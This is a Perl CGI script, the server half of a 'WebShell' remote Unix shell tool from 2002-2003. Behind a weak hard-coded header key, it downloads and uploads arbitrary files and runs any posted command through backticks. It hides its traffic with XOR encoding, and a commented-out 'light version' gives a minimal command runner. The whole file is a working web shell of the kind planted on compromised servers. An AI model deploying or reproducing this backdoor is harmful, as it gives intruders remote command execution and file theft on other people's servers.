#!/usr/bin/perl
#
# This file is part of WebShell which is distributed under the terms of the  GNU
# General Public License v2.0 and  is  (c)  copyright  2002,2003  Alex   Dyatlov
# <alex [at] gray-world.net> and Simon Castro <scastro [at] entreelibre.com>.
# See README and COPYING files for details or check http://gray-world.net
#
# wsh-s.pl - cgi based remote unix shell (server part)
# replace KEY with your alpha-numeric key
#
# VERSION 2.1.0

my $win32 = 0;			# set $win32 = 1 to turn on WIN support
my $encode = 1;			# set $encode = 1 to turn on Xor encoding
my $invert = 85;		
if ($ENV{HTTP_HTTP_X_KEY} eq "123456"){	 # <-- replace KEY with yours <key>
	if (defined($ENV{HTTP_HTTP_X_FILEGET})){ 
	unless (open(F,$ENV{HTTP_HTTP_X_FILEGET})){
		print "Content-Type: text/plain\r\n\r\n";
		exit 0;} 
	__win32() if ($win32 == 1);
	syswrite(STDOUT, "Content-Type: application/octet-stream\r\n\r\n");
	my $p = 0; 
while ((my $b=read(F,my $buf,10240,my $p))){
	$buf = xi($buf) if ($encode); 
	$p += $b; 
	while ($b){exit 0 unless ($ba = syswrite(STDOUT, $buf, $b));$b -= $ba;}
	}
close(F); 
exit 0;} 
print "Content-Type: text/plain\r\n\r\n";
if (defined($ENV{HTTP_HTTP_X_FILEPUT}))
{
	unless (open(F,"> $ENV{HTTP_HTTP_X_FILEPUT}")) {exit 0;} 
	__win32() if ($win32 == 1); 
	while (my $b=sysread(STDIN,my $buf,10240))
	{
	$buf = xi($buf) if ($encode); 
	my $w = syswrite(F,$buf,$b) or print STDERR "$!\n";
	}
	close(F); 
	exit 0;
} 
read(STDIN,my $c,$ENV{CONTENT_LENGTH});
$c = xi($c) if ($encode); 
my $res = `$c 2>&1`; 
$res = xi($res) if ($encode);
print $res; 
exit 0;}
 
#######################################################
sub __win32 {
binmode STDOUT; 
binmode STDIN; 
binmode F;}

sub xi {
my $buf = $_[0]; 
$buf =~ s/(.{1})/$1 ^ chr($invert)/esg; 
return $buf;}


# light version, without wshget/wshput and Xor encoding support
#
# if ($ENV{HTTP_X_KEY} eq "KEY"){			#<-- replace KEY
# read(STDIN, my $c, $ENV{CONTENT_LENGTH});
# print "Content-Type: text/plain\r\n\r\n";
# print `$c 2>&1`;exit 0;}
